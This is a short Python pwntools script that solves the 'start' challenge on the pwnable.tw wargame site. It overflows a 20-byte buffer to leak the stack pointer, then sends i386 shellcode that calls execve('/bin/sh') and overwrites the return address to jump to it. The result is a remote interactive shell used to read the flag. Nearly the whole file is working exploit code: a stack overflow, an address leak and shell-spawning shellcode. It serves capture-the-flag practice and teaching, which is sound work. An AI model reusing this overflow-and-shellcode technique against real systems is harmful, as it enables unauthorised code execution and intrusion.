#!/usr/bin/env python3
# This is an exploitation script for the start challenge of the
# wargame-site pwnable.tw

from pwn import *

binary = "./start"

context.terminal = ["gnome-terminal", "-e"]
context.binary = binary

#p = process(binary)
p = remote("chall.pwnable.tw", 10000)
p.recvuntil(":")

# Step 1:
# Leak the stackpointer
s = b'A' * 20 + p32(0x08048087)
p.send(s)
stackptr = p.read(20)[:4]

# Step 2:
# Now we can use the leaked stackpointer to calculate
# the offset to the start of our shellcode.
sc = [
    "mov eax, 0xb",
    "xor ecx, ecx",
    "xor edx, edx",
    "xor esi, esi",
    "push 0x0068732f", # /sh\x00
    "push 0x6e69622f", # /bin
    "mov ebx, esp",
    "int 0x80",
    "push 0x0804809d",
    "ret"
]

shellcode = asm("\n".join(sc))

# - overflow the buffer (buffer has 20 bytes)
# - rewrite the return address (jump to shellcode)
hack = b'A'*20 + p32(u32(stackptr)+20) + shellcode

p.send(hack)

# Step 3:
# The shellcode spawns a shell. Read the flag from /home/start/flag
# interactively.
p.interactive()
